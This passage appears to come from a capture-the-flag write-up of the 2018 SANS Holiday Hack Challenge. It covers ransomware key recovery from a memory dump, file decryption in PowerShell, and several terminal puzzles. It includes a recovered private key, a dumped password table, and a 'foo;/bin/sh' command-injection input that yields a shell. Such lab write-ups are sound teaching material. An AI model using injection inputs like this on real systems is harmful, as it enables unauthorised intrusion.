uGmaIcj6Nzdzr + 7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M + dKG2 Emz3zaJNiAIX89UcvelrXTV00k + kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG 4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG / T3VsC81jO6jdatRpXB 0URM8 / 4MB / vRAL8LB834ZKhnSNyzgh9N5G9 / TAB9qJJ + 4RYlUUOVIhK + 8t863498 / P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q 8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli + qP5ftySHhqy94okwerE KcHw3VaJVM9J17Atk4m1aL + v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4 eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v sC9DeS + DIGqrN / 0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx moCJympCYqT / WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7 / nmBKKy DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7 + 9otN8hWxnqe4 Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G + 2 +/ 7dGlKiOTC3Qn3wz8QoG4v5xAqXE JKBn972KvO0eQ5niYehG4yBaImHH + h6NVBlFd0GJ5VhzaBJyoOk + KnOnvVYbrGBq UdrzXvSwyFuuIqBlkHnWSIeC ---- -END PRIVATE KEY ----- So we retreived the attacker's private key. I'm sure he didn't mean to leave that lying around! Now if we can get our hands on some data that was encrypted with the server's public key (specifically, the file encryption key), then we should be able to decrypt it. We know from our static analysis that the encryption key is cleared from memory after the files are encrypted, so we're not going to find that key anywhere in memory. However, the encrypted key ($Pub_key_encrypted_Key) is not cleared from memory, so it should be in the memory dump file that Alabaster provided. $Pub_key_encrypted_Key = ( Pub_Key_Enc $Byte_key $pub_key ). ToString () Using the debugger again, we can check to see what the encrypted file encryption key looks like. In order to get the malware to run far enough, we'll need to comment out the kill switch that checks to see if the computer is a member of the KRINGLECASTLE domain. #if ($(netstat -ano | Select-String 127.0.0.1:8080 ).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne KRINGLECASTLE ) {return} Now create a breakpoint right after the $Pub_key_encrypted_key variable is set, and run the program. When you hit the breakpoint, take a look inside $Pub_key_encrypted_key to see what the value of that variable is. As you can see, the is 512 bytes in length and is made up of hexadecimal characters. Use the PowerDump tool that was introduced in Chris Davis' KringleCon talk to search through Alabaster's memory dump for a variable containing data matching those characteristics. To keep this brief, I've cut out all of the menus and am displaying only the options and commands that were run in Powerdump, along with some explaination of what we're doing: ============================== | __ \\ | |__) |____ _____ _ __ | ___/ _ \\ \\ /\\ / / _ \\ __| | | | (_) \\ V V / __/ | |_| \\___/ \\_/\\_/ \\___|_| __ __ \\ \\ ( ) / / \\ \\_ ( ) ( _/ / \\__\\ ) _ ) /__/ \\\\ ( \\_ // `\\ _(_\\ \\)__ / (____\\___)) _____ _ _ __ __ _____ | __ \\| | | | \\/ | __ \\ | | | | | | | \\ / | |__) | | | | | | | | |\\/| | ___/ | |__| | |__| | | | | | |_____/ \\____/|_| |_|_| Dumps PowerShell From Memory ============================== : 1 (Load PowerShell Memory Dump File) : ld c:\\hhc18\\forensic_artifacts\\powershell.exe_181109_104716.dmp (Load Alabaster s dump file) : b (Back to previous menu) : 2 (Process the dump file) : 4 (Search/Dump Stored PS Variables) : len == 512 (Set search criteria for values that are 512 bytes long) : matches ^[a-fA-F0-9]*$ (Set search criteria for values containing only hexadecimal characters) : print (Print all of the matching values found) This produces the following output: 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 Variable Values #1 above ^ Type any key to go back and just Enter to Continue... Since we only came up with one matching value, we'll have to assume that's the one we're looking for. To make it easy to use the private key, we can import it into the Windows certificate store. First, create a PKCS #12 format file to hold the certificate and private key. C:\\hhc18 openssl pkcs12 -export -out wannacookie.pfx -inkey server.key -in server.crt Import this into the current user's Personal certificate store using the Certificates MMC add-on. Now modify the malware a little bit to reverse the encryption. Make a copy of the wannacookie.ps1 file and remove the wannacookie function. This will give us access to all of the program's other functions so we don't have to reinvent the wheel entirely. Then, add the following code at the end of the file: $encrypted_key = 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 ; $encrypted_key_bytes = $( H2B $encrypted_key ); $cert = Get-ChildItem Cert : \\ CurrentUser \\ My \\ ` | Where-Object { $_ . Subject -like O=Internet Widgits Pty Ltd* } $akey = $cert . PrivateKey . Decrypt ( $encrypted_key_bytes , $true ) [array] $allcookies = $( Get-ChildItem -Path $( $env:userprofile ) ` -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } ` | Foreach -Object { $_ . Fullname }) enc_dec $akey $allcookies $false What does this do? Create a variable to hold the encrypted file encryption key obtained from Alabaster's memory dump Process the encrypted key through the H2B (hex to bytes) function provided by the malware Fetch the certificate (which now also contains the private key) from the current user's certificate store and place it in $cert Decrypt the file encryption key and store it in $akey Using the original code from the malware, create a list of files in the user's profile containing *.wannacookie Pass the decrypted file encryption key (now in $akey) along with the list of files to the enc_dec function After running the modified code, I can now see that the .wannacookie extension has been removed from Alabaster's elfdb password file! The first few bytes of the file indicate that this is a SQLite database file, so we'll have to load the file into SQLite and run a query to pull out the data. C:\\SQLite sqlite3.exe SQLite version 3.26.0 2018-12-01 12:34:55 Enter .help for usage hints. Connected to a transient in-memory database. Use .open FILENAME to reopen on a persistent database. sqlite .open C:/Users/IEUser/Documents/forensic_artifacts/alabaster_passwords.elfdb sqlite .schema CREATE TABLE IF NOT EXISTS passwords ( `name` TEXT NOT NULL, `password` TEXT NOT NULL, `usedfor` TEXT NOT NULL ); sqlite select * from passwords; alabaster.snowball|CookiesR0cK!2!#|active directory alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com Amongst a list of other passwords, we can see that the vault password for alabaster.snowball is ED#ED#EED#EF#G#F#G#ABA#BA#B , which completes this final part of the objective.","title":"Solution"},{"location":"Terminals/1-namegame.html","text":"The Name Game Location: Lobby Problem We just hired this new worker, Californian or New Yorker? Think he s making some new toy bag... My job is to make his name tag. Golly gee, I m glad that you came, I recall naught but his last name! Use our system or your own plan, Find the first name of our guy Chan! -Bushy Evergreen To solve this challenge, determine the new worker s first name and submit to runtoanswer. Hints Minty Candycane introduces this terminal: Can you help me? I'm in a bit of a fix. I need to make a nametag for an employee, but I can't remember his first name. Maybe you can figure it out using this Cranberry Pi terminal? The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken. PowerShell itself can be tricky when handling user input. Special characters such as and ; can be used to inject commands. I think that system is one of Alabaster's creations. He's a little ... obsessed with SQLite database storage. I don't know much about SQLite, just the .dump command. Minty also provides a link to a webpage on dumping a SQLite3 database: https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database Minty also provides a link to a webpage on PowerShell command injection: https://ss64.com/ps/call.html Solution This challenge calls for us to inject operating system commands through the text menu system. When you submit employee information through option #1, the system reports that data is being saved to a SQLite database. That's going to come in handy later. ==================================================================== = = = S A N T A S C A S T L E E M P L O Y E E O N B O A R D I N G = = = ==================================================================== Press 1 to start the onboard process. Press 2 to verify the system. Press q to quit. Please make a selection: 1 Welcome to Santa s Castle! At Santa s Castle, our employees are our family. We care for each other, and support everyone in our common goals. Your first test at Santa s Castle is to complete the new employee onboarding paperwork. Don t worry, it s an easy test! Just complete the required onboarding information below. Enter your first name. : Abe Enter your last name. : Lincoln Enter your street address (line 1 of 2). : 123 Street Enter your street address (line 2 of 2). : Enter your city. : Washington Enter your postal code. : 12345 Enter your phone number. : 2345678901 Enter your email address. : no@no.no Is this correct? Abe Lincoln 123 Street Washington, 12345 2345678901 no@no.no y/n: y Save to sqlite DB using command line Press Enter to continue...: Option #2 allows you to enter an IP address that the system will use as an argument when running the ping command. On the back end, the system executes ping $ipaddr , so if we add a semi-colon the system might execute whatever we type next as a separate command. ==================================================================== = = = S A N T A S C A S T L E E M P L O Y E E O N B O A R D I N G = = = ==================================================================== Press 1 to start the onboard process. Press 2 to verify the system. Press q to quit. Please make a selection: 2 Validating data store for employee onboard information. Enter address of server: foo;/bin/sh ping: unknown host foo $ id uid=1000(elf) gid=1000(elf) groups=1000(elf) I entered foo;/bin/sh , which resulted in the system executing ping foo and then /bin/sh , and I got a shell prompt back. Let's see what we can find. $ ls -la total 5480 drwxr-xr-x 1 elf elf 4096 Dec 27 00:27 . drwxr-xr-x 1 root root 4096 Dec 14 16:17 .. -rw-r--r-- 1 elf elf 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 root root 95 Dec 14 16:13 .bashrc drwxr-xr-x 3 elf elf 4096 Dec 27 00:23 .cache drwxr-xr-x 3 elf elf 4096 Dec 27 00:23 .local -rw-r--r-- 1 root root 3866 Dec 14 16:13 menu.ps1 -rw-rw-rw- 1 root root 24576 Dec 27 00:25 onboard.db -rw-r--r-- 1 elf elf 655 May 16 2017 .profile -rwxr-xr-x 1 root root 5547968 Dec 14 16:13 runtoanswer -rw------- 1 elf elf 33 Dec 27 00:27 .sqlite_history There's an SQLite database in the user elf's home directory. We can open that with the sqlite3 tool and query the data for the answer to this challenge. $ sqlite3 SQLite version 3.11.0 2016-02-15 17:29:24 Enter .help for usage hints. Connected to a transient in-memory database. Use .open FILENAME to reopen on a persistent database. sqlite .open onboard.db sqlite .schema CREATE TABLE onboard ( id INTEGER PRIMARY KEY, fname TEXT NOT NULL, lname TEXT NOT NULL, street1 TEXT, street2 TEXT, city TEXT, postalcode TEXT, phone TEXT, email TEXT ); sqlite select * from onboard where lname = Chan ; 84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com sqlite .quit $ runtoanswer Loading, please wait...... Enter Mr. Chan s first name: Scott .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool: ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo; oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW OMMMMMMMMMMMMW: .. ;MMMk .NMX:. . .lWO d xMMMMMMMMMMMW OMMMMMMMMMMMMo OMMWXMMl lNMMNxWK ,XMMMO .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMX. .cOWMN MMMMMMM; WMMMMMc KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMMMKo, KN ,MMMMMMM, WMMMMMc KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMKNMMMO oM, dWMMWOWk cWMMMO ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMc ... cWMWl. .. .NMk. .. .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;. Congratulations! Answer: Scott","title":"The Name Game"},{"location":"Terminals/1-namegame.html#the-name-game","text":"Location: Lobby","title":"The Name Game"},{"location":"Terminals/1-namegame.html#problem","text":"We just hired this new worker, Californian or New Yorker? Think he s making some new toy bag... My job is to make his name tag. Golly gee, I m glad that you came, I recall naught but his last name! Use our system or your own plan, Find the first name of our guy Chan! -Bushy Evergreen To solve this challenge, determine the new worker s first name and submit to runtoanswer.","title":"Problem"},{"location":"Terminals/1-namegame.html#hints","text":"Minty Candycane introduces this terminal: Can you help me? I'm in a bit of a fix. I need to make a nametag for an employee, but I can't remember his first name. Maybe you can figure it out using this Cranberry Pi terminal? The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken. PowerShell itself can be tricky when handling user input. Special characters such as and ; can be used to inject commands. I think that system is one of Alabaster's creations. He's a little ... obsessed with SQLite database storage. I don't know much about SQLite, just the .dump command. Minty also provides a link to a webpage on dumping a SQLite3 database: https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database Minty also provides a link to a webpage on PowerShell command injection: https://ss64.com/ps/call.html","title":"Hints"},{"location":"Terminals/1-namegame.html#solution","text":"This challenge calls for us to inject operating system commands through the text menu system. When you submit employee information through option #1, the system reports that data is being saved to a SQLite database. That's going to come in handy later. ==================================================================== = = = S A N T A S C A S T L E E M P L O Y E E O N B O A R D I N G = = = ==================================================================== Press 1 to start the onboard process. Press 2 to verify the system. Press q to quit. Please make a selection: 1 Welcome to Santa s Castle! At Santa s Castle, our employees are our family. We care for each other, and support everyone in our common goals. Your first test at Santa s Castle is to complete the new employee onboarding paperwork. Don t worry, it s an easy test! Just complete the required onboarding information below. Enter your first name. : Abe Enter your last name. : Lincoln Enter your street address (line 1 of 2). : 123 Street Enter your street address (line 2 of 2). : Enter your city. : Washington Enter your postal code. : 12345 Enter your phone number. : 2345678901 Enter your email address. : no@no.no Is this correct? Abe Lincoln 123 Street Washington, 12345 2345678901 no@no.no y/n: y Save to sqlite DB using command line Press Enter to continue...: Option #2 allows you to enter an IP address that the system will use as an argument when running the ping command. On the back end, the system executes ping $ipaddr , so if we add a semi-colon the system might execute whatever we type next as a separate command. ==================================================================== = = = S A N T A S C A S T L E E M P L O Y E E O N B O A R D I N G = = = ==================================================================== Press 1 to start the onboard process. Press 2 to verify the system. Press q to quit. Please make a selection: 2 Validating data store for employee onboard information. Enter address of server: foo;/bin/sh ping: unknown host foo $ id uid=1000(elf) gid=1000(elf) groups=1000(elf) I entered foo;/bin/sh , which resulted in the system executing ping foo and then /bin/sh , and I got a shell prompt back. Let's see what we can find. $ ls -la total 5480 drwxr-xr-x 1 elf elf 4096 Dec 27 00:27 . drwxr-xr-x 1 root root 4096 Dec 14 16:17 .. -rw-r--r-- 1 elf elf 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 root root 95 Dec 14 16:13 .bashrc drwxr-xr-x 3 elf elf 4096 Dec 27 00:23 .cache drwxr-xr-x 3 elf elf 4096 Dec 27 00:23 .local -rw-r--r-- 1 root root 3866 Dec 14 16:13 menu.ps1 -rw-rw-rw- 1 root root 24576 Dec 27 00:25 onboard.db -rw-r--r-- 1 elf elf 655 May 16 2017 .profile -rwxr-xr-x 1 root root 5547968 Dec 14 16:13 runtoanswer -rw------- 1 elf elf 33 Dec 27 00:27 .sqlite_history There's an SQLite database in the user elf's home directory. We can open that with the sqlite3 tool and query the data for the answer to this challenge. $ sqlite3 SQLite version 3.11.0 2016-02-15 17:29:24 Enter .help for usage hints. Connected to a transient in-memory database. Use .open FILENAME to reopen on a persistent database. sqlite .open onboard.db sqlite .schema CREATE TABLE onboard ( id INTEGER PRIMARY KEY, fname TEXT NOT NULL, lname TEXT NOT NULL, street1 TEXT, street2 TEXT, city TEXT, postalcode TEXT, phone TEXT, email TEXT ); sqlite select * from onboard where lname = Chan ; 84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com sqlite .quit $ runtoanswer Loading, please wait...... Enter Mr. Chan s first name: Scott .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool: ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo; oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW OMMMMMMMMMMMMW: .. ;MMMk .NMX:. . .lWO d xMMMMMMMMMMMW OMMMMMMMMMMMMo OMMWXMMl lNMMNxWK ,XMMMO .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMX. .cOWMN MMMMMMM; WMMMMMc KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMMMKo, KN ,MMMMMMM, WMMMMMc KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMKNMMMO oM, dWMMWOWk cWMMMO ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW OMMMMMMMMMMMMc ... cWMWl. .. .NMk. .. .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;. Congratulations! Answer: Scott","title":"Solution"},{"location":"Terminals/10-ventilation.html","text":"Ventilation Maze Location: Lobby Problem This isn't exactly a terminal, but it had to be included somewhere in my write-up. This challenge requires you to find your way through a ductwork maze, just as John McClane did at Nakatomi Plaza. If you make it all the way to the end, you'll pop out in Santa's Secret Room. Solution You can use a piece of graph paper to help find your way, or you can find the diagrams on the Kringle Castle git repository. The files are encrypted, but the password is found in the commit history, as we discovered in the Data Repo objective.","title":"Ventilation Maze"},{"location":"Terminals/10-ventilation.html#ventilation-maze","text":"Location: Lobby","title":"Ventilation Maze"},{"location":"Terminals/10-ventilation.html#problem","text":"This isn't exactly a terminal, but it had to be included somewhere in my write-up. This challenge requires you to find your way through a ductwork maze, just as John McClane did at Nakatomi Plaza. If you make it all the way to the end, you'll pop out in Santa's Secret Room.","title":"Problem"},{"location":"Terminals/10-ventilation.html#solution","text":"You can use a piece of graph paper to help find your way, or you can find the diagrams on the Kringle Castle git repository. The files are encrypted, but the password is found in the commit history, as we discovered in the Data Repo objective.","title":"Solution"},{"location":"Terminals/2-editorskills.html","text":"Essential Editor Skills Location: Lobby Problem I m in quite a fix, I need a quick escape. Pepper is quite pleased, while I watch here, agape. Her editor s confusing, though best she says - she yells! My lesson one and your role is exit back to shellz. -Bushy Evergreen Exit vi. Hints Bushy Evergreen introduces this terminal: Hi, I'm Bushy Evergreen. I'm glad you're here, I'm the target of a terrible trick. Pepper says his editor is the best, but I don't understand why. He's forcing me to learn vi. He gave me a link, I'm supposed to learn the basics. Can you assist me with one of the simple cases? Bushy also provides a link to a webpage on Vi Editor Basics: https://kb.iu.edu/d/afcz Solution :q! Loading, please wait...... You did it! Congratulations! elf@12a0fe7d095e:~$ Answer: use the :q! command to exit out of vi","title":"Essential Editor Skills"},{"location":"Terminals/2-editorskills.html#essential-editor-skills","text":"Location: Lobby","title":"Essential Editor Skills"},{"location":"Terminals/2-editorskills.html#problem","text":"I m in quite a fix, I need a quick escape. Pepper is quite pleased, while I watch here, agape. Her editor s confusing, though best she says - she yells! My lesson one and your role is exit back to shellz. -Bushy Evergreen Exit vi.","title":"Problem"},{"location":"Terminals/2-editorskills.html#hints","text":"Bushy Evergreen introduces this terminal: Hi, I'm Bushy Evergreen. I'm glad you're here, I'm the target of a terrible trick. Pepper says his editor is the best, but I don't understand why. He's forcing me to learn vi. He gave me a link, I'm supposed to learn the basics. Can you assist me with one of the simple cases? Bushy also provides a link to a webpage on Vi Editor Basics: https://kb.iu.edu/d/afcz","title":"Hints"},{"location":"Terminals/2-editorskills.html#solution","text":":q! Loading, please wait...... You did it! Congratulations! elf@12a0fe7d095e:~$ Answer: use the :q! command to exit out of vi","title":"Solution"},{"location":"Terminals/3-curling.html","text":"CURLing Master Location: West Wing Problem I am Holly Evergreen, and now you won t believe: Once again the striper stopped; I think I might just leave! Bushy set it up to start upon a website call. Darned if I can CURL it on - my Linux skills apall. Could you be our CURLing master - fixing up this mess? If you are, there s one concern you surely must address. Something s off about the conf that Bushy put in place. Can you overcome this snag and save us all some face? Complete this challenge by submitting the right HTTP request to the server at http://localhost:8080/ to get the candy striper started again. You may view the contents of the nginx.conf file in /etc/nginx/, if helpful. Hints Holly Evergreen introduces the terminal challenge by saying: Hi, I'm Holly Everygreen. Oh that Bushy! Sorry to vent, but that brother of mine did something strange. The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2. I sometimes wonder if all IT folk do strange things with their home networks... Holly also provides a link to a webpage on HTTP/2.0 Basics: https://developers.google.com/web/fundamentals/performance/http2/ Solution The challenge hints that we need to send a request using HTTP2 to the web server on localhost port 8080. The initial attempt results in a strange series of non alphanumeric characters. A check of the files in the home directory reveal a .bash_history that would contain commands executed by this user during previous sessions. Using the history command, we can see that curl was executed with the --http2-prior-knowledge option, which means to use HTTP2 directly without upgrading from HTTP/1.1. Resubmitting the request gives us some HTML that states we need to post \"status=on\" to activate the candy striper, so we add the -d option and that gives us the win. elf@b2d082a5b5b2:~$ curl http://localhost:8080 \u0012\u0004 \ufffd\u0004\u0001\ufffd\ufffd\ufffdelf@b2d082a5b5b2:~$ elf@b2d082a5b5b2:~$ ls -la total 24 drwxr-xr-x 1 elf elf 4096 Dec 14 16:15 . drwxr-xr-x 1 root root 4096 Dec 14 16:14 .. -rw-r--r-- 1 elf elf 464 Dec 14 16:13 .bash_history -rw-r--r-- 1 elf elf 220 May 15 2017 .bash_logout -rw-r--r-- 1 elf elf 3543 Dec 14 16:15 .bashrc -rw-r--r-- 1 elf elf 675 May 15 2017 .profile elf@f72adf5c13df:~$ history 1 netstat -ant 2 ncat --broker -nlvp 9090 3 echo \\302\\257\\_(\\343\\203\\204)_/\\302\\257 /tmp/shruggins 4 cat /tmp/shruggins 5 curl --http2-prior-knowledge http://localhost:8080/index.php elf@f72adf5c13df:~$ curl --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on /body /html elf@1a747f9db027:~$ curl -d status=on --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on Unencrypted 2.0? He s such a silly guy. That s the kind of stunt that makes my OWASP friends all cry. Truth be told: most major sites are speaking 2.0; TLS connections are in place when they do so. -Holly Evergreen p Congratulations! You ve won and have successfully completed this challenge. p POSTing data in HTTP/2.0. /body /html Answer: curl -d \"status=on\" --http2-prior-knowledge http://localhost:8080/index.php","title":"CURLing Master"},{"location":"Terminals/3-curling.html#curling-master","text":"Location: West Wing","title":"CURLing Master"},{"location":"Terminals/3-curling.html#problem","text":"I am Holly Evergreen, and now you won t believe: Once again the striper stopped; I think I might just leave! Bushy set it up to start upon a website call. Darned if I can CURL it on - my Linux skills apall. Could you be our CURLing master - fixing up this mess? If you are, there s one concern you surely must address. Something s off about the conf that Bushy put in place. Can you overcome this snag and save us all some face? Complete this challenge by submitting the right HTTP request to the server at http://localhost:8080/ to get the candy striper started again. You may view the contents of the nginx.conf file in /etc/nginx/, if helpful.","title":"Problem"},{"location":"Terminals/3-curling.html#hints","text":"Holly Evergreen introduces the terminal challenge by saying: Hi, I'm Holly Everygreen. Oh that Bushy! Sorry to vent, but that brother of mine did something strange. The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2. I sometimes wonder if all IT folk do strange things with their home networks... Holly also provides a link to a webpage on HTTP/2.0 Basics: https://developers.google.com/web/fundamentals/performance/http2/","title":"Hints"},{"location":"Terminals/3-curling.html#solution","text":"The challenge hints that we need to send a request using HTTP2 to the web server on localhost port 8080. The initial attempt results in a strange series of non alphanumeric characters. A check of the files in the home directory reveal a .bash_history that would contain commands executed by this user during previous sessions. Using the history command, we can see that curl was executed with the --http2-prior-knowledge option, which means to use HTTP2 directly without upgrading from HTTP/1.1. Resubmitting the request gives us some HTML that states we need to post \"status=on\" to activate the candy striper, so we add the -d option and that gives us the win. elf@b2d082a5b5b2:~$ curl http://localhost:8080 \u0012\u0004 \ufffd\u0004\u0001\ufffd\ufffd\ufffdelf@b2d082a5b5b2:~$ elf@b2d082a5b5b2:~$ ls -la total 24 drwxr-xr-x 1 elf elf 4096 Dec 14 16:15 . drwxr-xr-x 1 root root 4096 Dec 14 16:14 .. -rw-r--r-- 1 elf elf 464 Dec 14 16:13 .bash_history -rw-r--r-- 1 elf elf 220 May 15 2017 .bash_logout -rw-r--r-- 1 elf elf 3543 Dec 14 16:15 .bashrc -rw-r--r-- 1 elf elf 675 May 15 2017 .profile elf@f72adf5c13df:~$ history 1 netstat -ant 2 ncat --broker -nlvp 9090 3 echo \\302\\257\\_(\\343\\203\\204)_/\\302\\257 /tmp/shruggins 4 cat /tmp/shruggins 5 curl --http2-prior-knowledge http://localhost:8080/index.php elf@f72adf5c13df:~$ curl --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on /body /html elf@1a747f9db027:~$ curl -d status=on --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on Unencrypted 2.0? He s such a silly guy. That s the kind of stunt that makes my OWASP friends all cry. Truth be told: most major sites are speaking 2.0; TLS connections are in place when they do so. -Holly Evergreen p Congratulations! You ve won and have successfully completed this challenge. p POSTing data in HTTP/2.0. /body /html Answer: curl -d \"status=on\" --http2-prior-knowledge http://localhost:8080/index.php","title":"Solution"},{"location":"Terminals/4-stallmucking.html","text":"Stall Mucking Report Location: East Wing Problem Thank you Madam or Sir for the help that you bring! I was wondering how I might rescue my day. Finished mucking out stalls of those pulling the sleigh, My report is now due or my KRINGLE s in a sling! There s a samba share here on this terminal screen. What I normally do is to upload the file, With our network credentials (we ve shared for a while). When I try to remember, my memory s clean! Be it last night s nog bender or just lack of rest, For the life of me I can t send in my report. Could there be buried hints or some way to contort, Gaining access - oh please now do give it your best! -Wunorse Openslae Complete this challenge by uploading the elf s report.txt file to the samba share at //localhost/report-upload/ Hints Wunorse Openslae introduces this terminal: What was that password? Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them! I've got to upload my chore report to my manager's inbox, but I can't remember my password. Still, with all the automated tasks we use, I'll bet there's a way to find it in memory... Wunorse also provides a link to a 